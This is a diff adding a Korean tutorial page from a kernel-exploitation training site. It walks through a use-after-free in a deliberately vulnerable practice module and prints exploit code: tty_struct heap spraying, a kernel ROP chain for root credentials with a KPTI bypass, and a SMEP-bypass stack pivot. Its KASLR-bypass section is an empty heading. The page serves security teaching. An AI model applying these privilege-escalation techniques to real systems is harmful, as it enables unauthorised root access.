@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="kr">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//kr/linux-kernel/LK01/use_after_free.html">
+
+    <meta name="og:title" content="Holstein v3: Use-after-Free 악용 - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Holstein v3: Use-after-Free 악용 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/kr/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/kr/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/kr/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/use_after_free">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK01/use_after_free">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK01/use_after_free">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Holstein v3: Use-after-Free 악용
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/use_after_free">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK01/use_after_free">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK01/use_after_free">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="heap_overflow.html">이전 페이지</a></div>
+            <div class="pagination-index"><a href="../index.html">목차</a></div>
+            <div class="pagination-fd"><a href="race_condition.html">다음 페이지</a></div>
+        </div>
+    
+    
+        <div class="column" title="목차">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%ED%8C%A8%EC%B9%98-%EB%B6%84%EC%84%9D%EA%B3%BC-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A1%B0%EC%82%AC"><span class="toc-text">패치 분석과 취약점 조사</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KASLR-%EC%9A%B0%ED%9A%8C"><span class="toc-text">KASLR 우회</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kROP-%EA%B5%AC%ED%98%84"><span class="toc-text">kROP 구현</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EB%8D%A4-RIP-%EC%A0%9C%EC%96%B4%EC%99%80-SMEP-%EC%9A%B0%ED%9A%8C"><span class="toc-text">덤: RIP 제어와 SMEP 우회</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>지난 장에서는 Holstein 모듈의 Heap Overflow를 악용해 권한 상승에 성공했습니다. 하지만 Holstein 개발자는 또다시 취약점을 수정하고 Holstein v3를 공개했습니다. 이번 장에서는 개선된 Holstein 모듈 v3를 exploit해 보겠습니다.</p>
+<h2 id="패치-분석과-취약점-조사">패치 분석과 취약점 조사</h2>
+<p>먼저 <a href="distfiles/LK01-3.tar.gz">Holstein v3</a>를 다운로드하세요.</p>
+<p>v2와 비교했을 때 주요 차이점은 두 가지입니다. 첫째, <code>open</code>에서 버퍼를 할당할 때 <code>kzalloc</code>을 사용합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;kmalloc failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>kzalloc</code>은 <code>kmalloc</code>처럼 커널 힙에서 메모리를 할당하지만, 할당한 뒤 내용을 0으로 초기화한다는 점이 다릅니다. 즉 사용자 공간의 <code>calloc</code>에 대응하는 함수라고 생각하면 됩니다.</p>
+<p>둘째, <code>read</code>와 <code>write</code>에 크기 검사가 추가되어 Heap Overflow가 나지 않도록 막고 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_read</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                           <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &gt; BUFFER_SIZE) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;invalid buffer size\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(buf, g_buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                            <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                            <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_write called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &gt; BUFFER_SIZE) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;invalid buffer size\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(g_buf, buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_from_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>따라서 이번 버전의 커널 모듈에서는 Heap Overflow를 일으킬 수 없습니다.</p>
+<p>이제 <code>close</code> 구현을 봅시다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_close called\n&quot;</span>);</span><br><span class="line">  kfree(g_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>g_buf</code>가 더 이상 필요 없으니 <code>kfree</code>로 해제하지만, <code>g_buf</code> 변수에는 여전히 해제된 영역의 포인터가 남아 있습니다. 만약 <code>close</code> 이후에도 이 <code>g_buf</code>를 다시 사용할 수 있다면 Use-after-Free가 됩니다.</p>
+<p>어떤 독자는 &quot;그래도 <code>close</code>한 뒤에는 그 fd로 <code>read</code>나 <code>write</code>를 못 하니 Use-after-Free는 안 나는 것 아닌가?&quot;라고 생각할 수 있습니다. 단일 파일 디스크립터만 보면 맞는 말입니다. 하지만 여기서 커널 공간 프로그램의 특성을 다시 떠올릴 필요가 있습니다.</p>
+<p>커널 공간에서는 동일한 자원을 여러 프로그램이 공유할 수 있습니다. Holstein 모듈도 하나의 프로그램만 <code>open</code>할 수 있는 것이 아니라, 여러 프로그램 또는 하나의 프로그램이 여러 번 <code>open</code>할 수 있습니다. 그렇다면 다음과 같이 쓰면 어떻게 될까요?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line"><span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">close(fd1);</span><br><span class="line">write(fd2, <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<p>첫 번째 <code>open</code>에서 <code>g_buf</code>가 할당되지만, 두 번째 <code>open</code>이 다시 <code>g_buf</code>를 새로운 버퍼로 덮어씁니다. 원래 버퍼는 해제되지 않아 메모리 누수가 생깁니다. 그 다음 <code>close(fd1)</code>를 호출하면 현재 <code>g_buf</code>가 해제됩니다. <code>fd1</code>은 더 이상 쓸 수 없지만 <code>fd2</code>는 아직 유효하므로, <code>fd2</code>를 통해 이미 해제된 <code>g_buf</code>에 계속 읽기/쓰기를 수행할 수 있습니다. 이것이 바로 Use-after-Free입니다.</p>
+<p>이 사례는 커널 코드가 <strong>여러 호출자가 자원을 공유한다</strong>는 점을 반드시 고려해서 설계되어야 함을 잘 보여 줍니다. 그 점을 놓치면 취약점이 아주 쉽게 생깁니다.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="늑대" ></div>
+  <p class="says">
+    `close`할 때 포인터를 `NULL`로 지우거나, `open`할 때 이미 `g_buf`가 할당되어 있으면 실패하도록 설계했다면 적어도 이번 같은 단순한 버그는 막을 수 있었겠지.<br>
+    하지만 그걸로 정말 충분한지는 다음 장에서 다시 보게 될 거야.
+  </p>
+</div>
+<h2 id="KASLR-우회">KASLR 우회</h2>
+<p>우선 커널 베이스 주소와 <code>g_buf</code>의 주소를 누출해 봅시다.<br>
+이번에는 취약점이 Heap Overflow가 아니라 Use-after-Free로 바뀌었을 뿐이고, 버퍼 크기는 여전히 0x400이므로 <code>tty_struct</code>를 계속 활용할 수 있습니다.</p>
+<h2 id="kROP-구현">kROP 구현</h2>
+<p>이제 ROP를 할 수 있는 상태가 되었습니다. 가짜 <code>tty_operations</code>를 준비한 뒤 ROP chain으로 stack pivot만 하면 됩니다.</p>
+<p>하지만 이번에는 지난 장과 달리 Use-after-Free이므로, 현재 제어 가능한 영역이 <code>tty_struct</code>와 겹쳐 있습니다. 당연히 <code>ioctl</code> 등으로 <code>tty_operations</code>를 사용할 때 <code>tty_struct</code> 안에는 실제로 참조되지 않는 필드도 많기 때문에, 그 공간 일부를 ROP chain이나 가짜 <code>tty_operations</code> 저장 공간으로 써도 되긴 합니다.</p>
+<p>다만 이제부터 공격에 사용할 구조체 대부분을 마구 깨뜨려 버리면 나중에 예상치 못한 불안정성이 생길 수 있고, ROP chain의 크기와 구조에도 큰 제약이 걸릴 수 있습니다. 가능하면 <code>tty_struct</code>와 실제 ROP chain은 분리된 영역에 두는 편이 좋습니다.</p>
+<p>그래서 이번에는 두 번째 Use-after-Free를 일으킵니다. 물론 <code>g_buf</code>는 하나뿐이므로, 먼저 주소를 이미 알고 있는 현재 <code>g_buf</code>에 ROP chain과 가짜 <code>tty_operations</code>를 써 넣습니다. 그다음 다른 쪽에서 다시 Use-after-Free를 발생시키고, 그 두 번째 <code>tty_struct</code>의 함수 테이블을 덮어씁니다. 이렇게 하면 살아 있는 <code>tty_struct</code>의 함수 테이블 포인터만 바꾸면 되므로 더 안정적인 exploit를 만들 수 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ROP chain</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf;</span><br><span class="line">*chain++ = rop_pop_rdi;</span><br><span class="line">*chain++ = <span class="number">0</span>;</span><br><span class="line">*chain++ = addr_prepare_kernel_cred;</span><br><span class="line">*chain++ = rop_pop_rcx;</span><br><span class="line">*chain++ = <span class="number">0</span>;</span><br><span class="line">*chain++ = rop_mov_rdi_rax_rep_movsq;</span><br><span class="line">*chain++ = addr_commit_creds;</span><br><span class="line">*chain++ = rop_bypass_kpti;</span><br><span class="line">*chain++ = <span class="number">0xdeadbeef</span>;</span><br><span class="line">*chain++ = <span class="number">0xdeadbeef</span>;</span><br><span class="line">*chain++ = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;win;</span><br><span class="line">*chain++ = user_cs;</span><br><span class="line">*chain++ = user_rflags;</span><br><span class="line">*chain++ = user_rsp;</span><br><span class="line">*chain++ = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 가짜 tty_operations</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x3f8</span>] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;</span><br><span class="line"></span><br><span class="line">write(fd2, buf, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 두 번째 Use-after-Free</span></span><br><span class="line"><span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line"><span class="type">int</span> fd4 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd3 == <span class="number">-1</span> || fd4 == <span class="number">-1</span>)</span><br><span class="line">  fatal(<span class="string">&quot;/dev/holstein&quot;</span>);</span><br><span class="line">close(fd3);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">50</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">  <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 함수 테이블 포인터 덮어쓰기</span></span><br><span class="line">read(fd4, buf, <span class="number">0x400</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x18</span>] = g_buf + <span class="number">0x3f8</span> - <span class="number">12</span>*<span class="number">8</span>;</span><br><span class="line">write(fd4, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// RIP 제어</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">50</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  ioctl(spray[i], <span class="number">0</span>, g_buf - <span class="number">8</span>); <span class="comment">// rsp=rdx; pop rbp;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>권한 상승이 되었다면 성공입니다. 전체 exploit는 <a href="exploit/uaf-krop.c">여기</a>에서 다운로드할 수 있습니다.</p>
+<center>
+  <img src="img/uaf_privesc.png" alt="UAF를 통한 권한 상승" style="width:320px;">
+</center>
+<p>이처럼 Heap Overflow나 Use-after-Free 같은 취약점은 커널 공간에서는 사용자 공간의 같은 취약점보다 더 쉽게 exploit 가능한 경우가 많습니다. 커널 힙이 공유되어 있고, 함수 포인터나 민감한 필드를 가진 다양한 구조체를 공격에 활용할 수 있기 때문입니다.</p>
+<p>반대로 말하면, 취약점이 발생한 객체와 같은 크기 클래스에 있으면서 공격에 유용한 구조체를 찾지 못하면 exploit는 훨씬 어려워집니다.</p>
+<h2 id="덤-RIP-제어와-SMEP-우회">덤: RIP 제어와 SMEP 우회</h2>
+<p>이번에는 관련 보안 기법들을 모두 우회했습니다.<br>
+지난 장에서도 잠깐 언급했지만, SMAP가 꺼져 있고 SMEP만 켜져 있는 경우에는 약간 다른 간단한 방법을 쓸 수 있습니다. 예를 들어 RIP를 제어한 상태에서 다음과 같은 gadget를 사용할 수 있다고 합시다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81516264: mov esp, 0x39000000; ret;</span><br></pre></td></tr></table></figure>
+<p>미리 사용자 공간의 <code>0x39000000</code>을 <code>mmap</code>으로 확보하고 그곳에 ROP chain을 써 두었다면, 이 gadget는 stack pivot를 통해 사용자 공간 ROP chain으로 흐름을 옮깁니다. 이렇게 되면 커널 공간에 ROP chain을 둘 필요도 없고, 그 힙 주소를 따로 알아낼 필요도 없습니다.</p>
+<p>주의할 점은 <code>RSP</code>가 8바이트 정렬을 만족하도록 만들어야 한다는 것입니다. 스택 포인터 정렬이 깨진 상태에서 정렬을 요구하는 명령이 실행되면 exploit가 바로 크래시할 수 있습니다.</p>
+<p>또한 <code>commit_creds</code>, <code>prepare_kernel_cred</code> 같은 함수는 스택을 소비하므로, 실제로는 <code>0x39000000</code>보다 조금 앞에서부터 매핑하고 여유 공간을 두는 편이 좋습니다. 대략 <code>0x8000</code>바이트 정도면 충분합니다.</p>
+<p>실제로 SMAP를 꺼 두고, 이런 gadget를 이용해 사용자 공간 ROP chain으로 pivot하여 권한 상승을 해 보세요. 그리고 pivot 대상 메모리를 <code>mmap</code>할 때는 <code>MAP_POPULATE</code> 플래그를 붙이세요. 그래야 물리 메모리가 미리 잡혀서 KPTI가 켜져 있어도 커널에서 그 매핑을 볼 수 있습니다.</p>
+<hr>
+<div class="column" title="예제 1">
+  <code>modprobe_path</code>를 덮어쓰거나 <code>cred</code> 구조체를 직접 바꾸는 등, ROP 없이 권한 상승하는 방법도 시도해 보세요.<br>
+</div>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="heap_overflow.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="race_condition.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
